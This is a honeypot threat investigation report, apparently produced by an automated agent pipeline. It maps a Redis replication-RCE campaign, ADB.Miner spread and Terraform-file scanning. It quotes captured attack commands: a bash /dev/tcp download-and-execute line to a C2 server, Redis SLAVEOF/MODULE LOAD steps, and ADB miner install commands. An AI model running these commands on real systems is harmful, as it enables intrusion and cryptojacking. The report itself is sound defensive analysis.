# Threat Investigation Report: Honeypot Activity Analysis

## 1) Investigation Scope
- **investigation_start:** 2026-03-10T16:00:07Z
- **investigation_end:** 2026-03-10T20:00:07Z
- **completion_status:** Complete
- **degraded_mode:** false

## 2) Executive Triage Summary
- **Top Services/Ports of Interest:** Activity was concentrated on Redis (6379), ADB (5555), VNC (5900+), and various web ports, with notable probes against uncommon ICS/SCADA protocols (guardian_ast, kamstrup).
- **Top Confirmed Known Exploitation:** The investigation confirmed two distinct, known campaigns:
    1.  A Redis RCE campaign using a master-slave replication technique to load a malicious module and establish C2 communication.
    2.  An Android crypto-mining campaign (ADB.Miner) spreading via open ADB ports.
- **Top Unmapped Exploit-Like Items:** Suspicious web requests were observed attempting to use shell command substitution (`/$(pwd)/*.auto.tfvars`) to discover Terraform variable files, representing a potentially novel reconnaissance technique.
- **Botnet/Campaign Mapping Highlights:** The Redis RCE campaign was successfully mapped to an attacker IP (`47.236.232.37`) and a suspected C2 server (`47.252.36.8`). The ADB.Miner activity was linked to a known malware family.
- **Major Uncertainties:** The deep investigation into the Redis C2 server stalled due to a lack of further activity from that IP in the logs during the time window. The intent and efficacy of the novel Terraform-related scanning remain unconfirmed.

## 3) Candidate Discovery Summary
The discovery phase surfaced 5 primary areas of interest by clustering anomalous honeypot interactions:
- **Redis RCE Attempts:** Grouped by the use of the `MODULE LOAD` command, indicative of remote code execution.
- **ADB Crypto-Miner:** Identified by commands associated with the installation and execution of the "ufo.miner" and "trinity" malware.
- **Suspicious Web Requests:** A novel pattern of web requests using shell command substitution (`$(pwd)`) to find sensitive Terraform files.
- **ICS Protocol Probes:** Low-volume probes for `guardian_ast` and `kamstrup_management_protocol`.
- **Redis Infrastructure:** Indicators of C2 infrastructure (`SLAVEOF` command) linked to the RCE attempts.

## 4) Emerging n-day Exploitation
No items were classified as emerging n-day. The primary exploit candidate involving Redis `MODULE LOAD` was re-classified as a known botnet technique based on deep investigation and OSINT enrichment.

## 5) Novel or Zero-Day Exploit Candidates
### Candidate 1
- **candidate_id:** NOV-01
- **classification:** novel exploit candidate
- **novelty_score:** 7
- **confidence:** Medium
- **provisional:** false
- **key evidence:**
    - **Counts:** 1 unique set of requests.
    - **Artifacts:**
        - ` /$(pwd)/*.auto.tfvars`
        - ` /$(pwd)/.env`
        - ` /$(pwd)/.env.development`
- **knownness checks performed + outcome:**
    - Compared against known CVEs and signatures; no direct match found.
    - OSINT search for the specific path combination was inconclusive, though the components are individually understood (shell substitution, Terraform files).
- **temporal checks:** unavailable
- **required follow-up:** Analyze other activity from the source IP `185.177.72.23` to understand the full scope and capability of the tool being used.

## 6) Botnet/Campaign Infrastructure Mapping
### Item 1: Redis RCE Botnet
- **item_id:** BOT-02 (related to candidate NDE-01)
- **campaign_shape:** fan-in
- **suspected_compromised_src_ips:** `47.236.232.37` (ASN: 45102, Alibaba US Technology Co., Ltd., Singapore)
- **suspected_staging indicators:**
    - A payload was downloaded directly from the C2. The downloader command was: `bash -c "exec 6<>/dev/tcp/47.252.36.8/60106 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/FLvxLJYxu6 && chmod +x /tmp/FLvxLJYxu6 && /tmp/FLvxLJYxu6 Lb1X7DXsV7kvN7JD6DDvSbw5KLhI8DLuTaQrKLtX7zPvQ7wpKLpI/jTpV7gqL6RL7TLwSr0jL7pI7Tf+Tb03K75L8DfoV78uI7xJ7zHvWb4uN7hK6C7sSrs3KLBP7jHvTlbKRIZcWD1ATwk=\"`
- **suspected_c2 indicators:**
    - **IP/Port:** `47.252.36.8:60106`
    - **Supporting Evidence:** The `SLAVEOF` command pointing to this IP, followed by the `system.exec` command to download and run a payload from it.
- **confidence:** High
- **operational notes:** This is a known Redis exploitation technique. The C2 IP should be blocked. The attacker IP shows multi-stage behavior, probing SSH (port 22) before exploiting Redis.

### Item 2: ADB.Miner Crypto-Mining
- **item_id:** BOT-01
- **campaign_shape:** fan-in
- **suspected_compromised_src_ips:** `183.11.242.151`
- **ASNs / geo hints:** Not available in provided state.
- **suspected_staging indicators:**
    - Payloads are dropped and installed on the target device via ADB. Key file artifacts include `ufo.apk` and binaries like `trinity`.
- **suspected_c2 indicators:** Not identified in the provided logs.
- **confidence:** High
- **operational notes:** This is the established ADB.Miner malware family. Activity confirms spread via open, unauthenticated ADB ports (5555).

## 7) Odd-Service / Minutia Attacks
### Item 1: ICS Protocol Probing
- **service_fingerprint:** Conpot honeypot, protocols: `guardian_ast`, `kamstrup_management_protocol`.
- **why it’s unusual/interesting:** These are Industrial Control System (ICS) protocols, indicating potential reconnaissance by an actor with an interest in operational technology (OT) environments. While `kamstrup` is a known utility meter protocol, `guardian_ast` is obscure.
- **evidence summary:** 8 total events. No payload or exploit attempt observed.
- **confidence:** Low
- **recommended monitoring pivots:** Continue monitoring for these protocols, specifically for any attempts to send payloads or interact beyond initial connection probes.

## 8) Known-Exploit / Commodity Exclusions
- **Credential Noise:** Standard brute-force attempts on SSH and other services using common usernames (`root`, `admin`, `user`) and passwords (`123456`, `password`, etc.).
- **VNC Scanning:** High-volume (25,395 hits) signature matches for "GPL INFO VNC server response," indicating widespread, non-targeted scanning.
- **Generic SSH Brute-Forcing:** The deep investigation into `170.64.131.34` confirmed it was exclusively a high-volume SSH scanner, representing commodity background noise.
- **Common Web Scanning:** Probes for common sensitive files and paths, such as `/.env`, `/.git/config`, and `/admin/config.php`.

## 9) Infrastructure & Behavioral Classification
- **Redis RCE Campaign (BOT-02):** Classified as **Exploitation**. Exhibits a **Fan-in** campaign shape, with compromised nodes connecting to a central C2. Infrastructure reuse is confirmed via the C2 IP `47.252.36.8`.
- **ADB.Miner Campaign (BOT-01):** Classified as **Exploitation**. Exhibits a **Fan-in** shape typical of self-propagating worms or malware campaigns.
- **Tanner `$(pwd)` Scanning (NOV-01):** Classified as **Scanning/Reconnaissance**. The source IP targeted multiple paths, suggesting a **Fan-out** shape from a single tool. No infrastructure reuse indicators were found.
- **ICS Protocol Probing (ODD-01):** Classified as **Scanning/Reconnaissance**. The campaign shape is unknown. It is notable for its **Odd-Service Fingerprint** targeting ICS protocols.

## 10) Evidence Appendix
### Novel Exploit Candidate: NOV-01
- **Source IPs:** `185.177.72.23`
- **Target Ports/Services:** 80/HTTP (Tanner)
- **Paths/Endpoints:** ` /$(pwd)/*.auto.tfvars`, ` /$(pwd)/.env`, ` /$(pwd)/.env.development`
- **Temporal Checks:** unavailable

### Botnet Mapping Item: BOT-02 (Redis RCE)
- **Source IPs:** `47.236.232.37` (Count: 54 events)
- **ASNs:** 45102 (Alibaba US Technology Co., Ltd.)
- **Target Ports/Services:** 6379/Redis, 22/SSH
- **Payload/Artifact Excerpts:**
    - `SLAVEOF 47.252.36.8 60106`
    - `MODULE LOAD /tmp/exp.so`
    - `system.exec "bash -c \"exec 6<>/dev/tcp/47.252.36.8/60106..."`
- **Staging/C2 Indicators:** `47.252.36.8:60106`, `http://47.252.36.8:60106/linux`
- **Temporal Checks:** First seen: `2026-03-10T18:45:55.000Z`, Last seen: `2026-03-10T18:49:40.326Z`

### Botnet Mapping Item: BOT-01 (ADB.Miner)
- **Source IPs:** `183.11.242.151`
- **Target Ports/Services:** 5555/ADB
- **Payload/Artifact Excerpts:** `pm install /data/local/tmp/ufo.apk`, `am start -n com.ufo.miner/com.example.test.MainActivity`, `/data/local/tmp/nohup /data/local/tmp/trinity`
- **Malware Hashes:**
    - `0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257`
    - `76ae6d577ba96b1c3a1de8b21c32a9faf6040f7e78d98269e0469d896c29dc64`
    - `a1b6223a3ecb37b9f7e4a52909a08d9fd8f8f80aee46466127ea0f078c7f5437`
    - `d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0`

## 11) Indicators of Interest
- **Attacker/Compromised IPs:**
    - `47.236.232.37` (Redis RCE actor)
    - `183.11.242.151` (ADB.Miner actor)
    - `185.177.72.23` (Novel Tanner web scanner)
- **Suspected C2 IPs:**
    - `47.252.36.8` (Redis RCE C2)
- **Payload Fragments / URIs:**
    - `http://47.252.36.8:60106/linux`
    - `com.ufo.miner/com.example.test.MainActivity`
    - `/$(pwd)/*.auto.tfvars`
- **Malware Hashes (SHA256):**
    - `0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257`
    - `76ae6d577ba96b1c3a1de8b21c32a9faf6040f7e78d98269e0469d896c29dc64`
    - `a1b6223a3ecb37b9f7e4a52909a08d9fd8f8f80aee46466127ea0f078c7f5437`
    - `d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0`

## 12) Backend Tool Issues
- No tool failures were encountered during the workflow.
- The deep investigation into the Redis C2 IP (`47.252.36.8`) was stalled due to a lack of additional logs associated with that IP within the investigation window. This represents an evidence gap, not a tool failure.

## 13) Agent Action Summary (Audit Trail)
- **agent_name:** ParallelInvestigationAgent
- **purpose:** Initial data collection across all honeypot types.
- **inputs_used:** `investigation_start`, `investigation_end`.
- **actions_taken:** Ran broad queries for baseline statistics (`get_total_attacks`), known signals (`get_alert_signature`, `get_cve`), credential stuffing (`get_input_usernames`), and honeypot-specific activity (`redis_duration_and_bytes`, `adbhoney_input`).
- **key_results:** Provided the initial dataset showing high VNC noise, Redis `MODULE LOAD` commands, ADB miner activity, and common credential brute-force attempts.
- **errors_or_gaps:** None.

- **agent_name:** CandidateDiscoveryAgent
- **purpose:** To identify and cluster novel or high-signal activity from the baseline data.
- **inputs_used:** All outputs from the ParallelInvestigationAgent.
- **actions_taken:** Used `two_level_terms_aggregated` to pivot on honeypot actions and source IPs. Used `search` to perform initial research on suspicious terms like "redis module load".
- **key_results:** Generated 5 candidates for validation, including two Redis-related campaigns, one ADB miner campaign, one novel web scanning technique, and one ICS probe cluster.
- **errors_or_gaps:** None.

- **agent_name:** CandidateValidationLoopAgent
- **purpose:** To perform initial validation on discovered candidates.
- **inputs_used:** Candidate queue from CandidateDiscoveryAgent.
- **actions_taken:** Ran 1 iteration, validating candidate `NDE-01` (Redis RCE). Used `kibanna_discover_query` to confirm the `MODULE LOAD` events.
- **key_results:** Confirmed the Redis RCE activity, providing a high-confidence lead for deep investigation.
- **errors_or_gaps:** The loop only performed one validation before the controller pivoted to a deep investigation.

- **agent_name:** DeepInvestigationLoopController
- **purpose:** To conduct an in-depth, iterative investigation starting from a high-confidence lead.
- **inputs_used:** Validated candidate `NDE-01`.
- **actions_taken:** Ran 3 iterations.
    1.  Pivoted on attacker IP `47.236.232.37`, uncovering the full Redis attack chain and C2 `47.252.36.8`.
    2.  Pivoted on C2 URL, which stalled, then pivoted to SSH activity, identifying a high-volume scanner.
    3.  Pivoted on the SSH scanner IP `170.64.131.34`, confirming it as commodity noise.
- **key_results:** Fully mapped the Redis RCE campaign from initial compromise to C2 communication. Ruled out the top SSH attacker as commodity noise.
- **errors_or_gaps:** The investigation stalled on the C2 lead due to a lack of further data, and the agent exited the loop after pursuing the SSH lead to a dead end.

- **agent_name:** OSINTAgent
- **purpose:** To enrich validated candidates and investigation findings with public intelligence.
- **inputs_used:** All 5 initial candidates.
- **actions_taken:** Used `search` to query for terms related to the candidates: `"redis" "MODULE LOAD" "exploit"`, `"com.ufo.miner"`, `"/$(pwd)/*.auto.tfvars"`, and ICS protocol names.
- **key_results:** Successfully mapped the Redis and ADB activities to known, established malware/botnet campaigns (Redis RCE via replication, ADB.Miner). Provided context for the novel Terraform-related web scanning but could not find a direct public mapping.
- **errors_or_gaps:** None.

- **agent_name:** ReportAgent
- **purpose:** To compile the final report from all workflow state outputs.
- **inputs_used:** All preceding agent state outputs.
- **actions_taken:** Assembled this markdown report.
- **key_results:** This report.
- **errors_or_gaps:** None.

- **agent_name:** SaveReportAgent
- **purpose:** To persist the final report to a file.
- **inputs_used:** The content of this report.
- **actions_taken:** Called `deep_agent_write_file`.
- **key_results:** Pending confirmation of file write status.
- **errors_or_gaps:** None.
